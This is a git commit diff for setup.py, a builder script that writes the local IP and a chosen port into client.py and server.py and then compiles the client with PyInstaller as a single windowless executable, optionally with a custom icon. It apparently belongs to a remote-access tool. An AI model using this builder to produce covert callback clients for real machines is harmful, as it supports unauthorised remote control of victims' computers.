509a65148d37e3139ba74caf089ab349117859a9
xp4xbox <nicman1080@gmail.com>
2018-04-18 15:17:56 -0400

    Improve error checking for setup.py and add comments

--- setup.py
+++ setup.py
@@ -1,12 +1,19 @@
 import os, sys, socket
 
+# get the path to python install dir
 python_path = os.path.dirname(sys.executable)
 
-objSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-objSocket.connect(("google.com", 0))
-strCurrentIP = objSocket.getsockname()[0]
-objSocket.close()
+try:
+    # create a dummy socket to get local IP address
+    objSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    objSocket.connect(("google.com", 0))
+    strCurrentIP = objSocket.getsockname()[0]
+    objSocket.close()
+except socket.error:
+    print("Make sure you are connected to the internet.")
+    sys.exit(0)
 
+# check to make sure client.py exists
 if not os.path.isfile("client.py"):
     print("client.py not found!")
     sys.exit(0)
@@ -34,6 +41,7 @@ strPort = input("\n" + "Enter port number (Press ENTER for default): ")
 if strPort == "":
     pass
 else:
+    # check to make sure port is a number between 0 and 65535
     if not strPort.isdigit():
         print("You must enter numeric value!")
         sys.exit(0)
@@ -41,20 +49,24 @@ else:
         print("You must enter a port between 0 and 65535!")
         sys.exit(0)
 
+    # check to make sure server exists
     elif not os.path.isfile("server.py"):
         print("server.py not found!")
         sys.exit(0)
 
+    # open server and put all lines in an array
     objServerFile = open("server.py", "r")
     arrFileContents = objServerFile.readlines()
     objServerFile.close()
 
     # use loop in order to ensure that line number doesnt matter
     for intCounter in range(0, len(arrFileContents)):
+        # if the current line is the line that sets the port, set the port
         if arrFileContents[intCounter][0:9] == "intPort =":
             arrFileContents[intCounter] = "intPort = " + strPort + "\n"
             break
 
+    # write lines to server
     objServerFile = open("server.py", "w")
     objServerFile.writelines(arrFileContents)
     objServerFile.close()
@@ -64,11 +76,16 @@ objClientFile = open("client.py", "r")
 arrFileContents = objClientFile.readlines()
 objClientFile.close()
 
+# if the user is not using dns
 if strChoice == "2" or strChoice == "1":
     for intCounter in range(0, len(arrFileContents)):
+        # check for the first occurrence of the host
         if arrFileContents[intCounter][0:9] == "strHost =" or arrFileContents[intCounter][0:11] == "# strHost =":
+            # set strHost to be the IP
             arrFileContents[intCounter] = "strHost = \"" + strCurrentIP + "\"" + "\n"
+            # comment out the line below used for DNS
             arrFileContents[intCounter + 1] = "# strHost = socket.gethostbyname(\"\")" + "\n"
+            # break for the first occurrence
             break
 else:
     for intCounter in range(0, len(arrFileContents)):
@@ -78,6 +95,7 @@ else:
             break
 
 if strPort != "":
+    # if the user entered a custom port, change it in the client
     for intCounter in range(0, len(arrFileContents)):
         if arrFileContents[intCounter][0:9] == "intPort =":
             arrFileContents[intCounter] = "intPort = " + strPort + "\n"
@@ -90,13 +108,15 @@ objClientFile.close()
 
 strIconChoice = input("\n" + "Path for icon (Press ENTER to skip): ")
 
+# remove quotes if there are any
 strIconChoice = strIconChoice.replace("\"", "")
 
-
+# if the user did not choose an icon build the client using pyinstaller
 if strIconChoice == "":
     os.system(python_path + "/Scripts/pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                       "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                       "--onefile --windowed")
+# check to make sure the icon exists and that it is a .ico file
 elif not os.path.isfile(strIconChoice):
     print("Invalid path!")
     sys.exit(0)
@@ -104,6 +124,7 @@ elif not strIconChoice.endswith(".ico"):
     print("Must be a .ico file!")
     sys.exit(0)
 else:
+    # build the client with an icon
     os.system(python_path + "/Scripts/pyinstaller client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                       "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                       "--onefile --windowed --icon=\"" + strIconChoice + "\"")
